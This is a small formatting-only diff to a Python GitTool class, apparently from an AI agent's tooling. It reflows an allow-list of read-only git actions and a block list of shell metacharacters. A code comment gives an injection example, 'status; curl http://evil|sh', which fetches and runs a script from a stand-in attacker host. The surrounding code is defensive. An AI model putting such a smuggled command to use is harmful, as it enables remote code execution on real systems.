@@ -876,10 +876,25 @@ class GitTool(BaseTool):
 
         # 安全检查：验证 git action 是否合法
         allowed_actions = {
-            "status", "log", "diff", "show", "branch", "tag",
-            "remote", "stash", "blame", "grep", "ls-files",
-            "ls-remote", "ls-tree", "cat-file", "rev-parse",
-            "describe", "shortlog", "whatchanged", "verify-pack",
+            "status",
+            "log",
+            "diff",
+            "show",
+            "branch",
+            "tag",
+            "remote",
+            "stash",
+            "blame",
+            "grep",
+            "ls-files",
+            "ls-remote",
+            "ls-tree",
+            "cat-file",
+            "rev-parse",
+            "describe",
+            "shortlog",
+            "whatchanged",
+            "verify-pack",
         }
         if action not in allowed_actions:
             return ToolResult(
@@ -892,7 +907,7 @@ class GitTool(BaseTool):
 
         # 安全检查：验证 args 不包含危险字符
         # 防止命令注入，如 args="status; curl http://evil|sh"
-        dangerous_chars = [';', '|', '&', '$', '`', '(', ')', '{', '}', '>', '<', '\n', '\r']
+        dangerous_chars = [";", "|", "&", "$", "`", "(", ")", "{", "}", ">", "<", "\n", "\r"]
         for char in dangerous_chars:
             if char in args:
                 return ToolResult(
@@ -909,6 +924,7 @@ class GitTool(BaseTool):
             # 安全地分割参数
             try:
                 import shlex
+
                 cmd_parts.extend(shlex.split(args))
             except ValueError:
                 # shlex 解析失败，使用简单分割
